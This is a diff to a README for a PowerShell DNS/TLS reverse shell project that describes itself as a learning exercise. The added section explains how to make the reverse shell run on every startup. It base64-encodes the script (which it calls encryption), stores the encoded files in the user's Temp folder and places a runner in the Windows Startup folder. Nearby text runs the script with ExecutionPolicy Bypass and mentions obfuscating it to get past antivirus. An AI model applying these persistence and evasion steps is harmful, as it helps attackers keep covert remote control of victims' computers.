@@ -81,6 +81,33 @@ This project is a learning exercise inspired by [Martin Sohn's PowerShell Revers
      powershell.exe -ExecutionPolicy Bypass -File .\powershell-reverseshell-dns-tls.ps1
      ```
 
+### Make reverseshell run on every startup
+
+1. **Encrypt your reverseshell:**
+
+    *Make Sure You Entered the IP and Port number first*
+    
+    ```powershell
+    $c = get-content -path .\powershell-reverseshell-dns-tls.ps1
+    $bytes = [system.text.encoding]::unicode.getbytes($c)
+    $encrypt = [convert]::tobase64string($bytes)
+    set-content -path .\powershell-encrypted.bin -value $encrypt
+    ```
+    *encrypt the decoder.ps1 file the same way*
+
+2. **Store them in User's Temp Directory:**
+
+    ```bash
+    %USERPROFILE%\AppData\Local\Temp
+    ```
+
+3. **Store runner.cmd file in:**
+
+    ```bash
+    %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup
+    ```
+
+
 ## Security Considerations
 
 - **Antivirus Detection:** Both scripts may trigger antivirus software. Adjustments or obfuscations might be necessary for testing in controlled environments.
